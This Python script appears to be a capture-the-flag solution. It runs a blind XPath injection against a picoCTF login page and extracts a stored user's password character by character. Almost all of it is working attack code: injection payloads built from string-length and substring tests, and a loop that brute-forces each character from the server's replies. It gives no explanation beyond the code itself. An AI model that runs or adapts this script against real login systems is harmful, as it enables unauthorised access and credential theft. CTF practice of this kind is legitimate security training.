import requests
import string
import bs4

MAP = {" You're on the right path.": True, " Login failure.": False}
CHARS = "0123456789" + string.ascii_lowercase + "{}_" + "CTF"


def gather_infos():
    i = 0
    while True:
        # attack = f"' or //user[{i}]/name ='admin' or .='"
        attack = f"' or string-length(//user[3]/pass)={i} or .='"

        r = requests.post("http://mercury.picoctf.net:33594/", data={"name": attack, "pass": ""})

        soup = bs4.BeautifulSoup(r.content.decode(), "html5lib")
        supa = str(soup.find("div", attrs={"id": "myAlert"})).split("-->")[1].split("\n")[0]
        if MAP[supa]:
            print(f"i = {i}", True)
            break
        else:
            print(i)
        i += 1


def get_password(length):
    pw = ""
    for j in range(length):
        for char in CHARS:
            attack = f"' or substring(//user[3]/pass, {j}, 1)='{char}' or .='"
            r = requests.post("http://mercury.picoctf.net:33594/", data={"name": attack, "pass": ""})
            if not "Login failure" in r.content.decode():
                pw += char
                print(pw)
                break
    return pw


print(get_password(51))
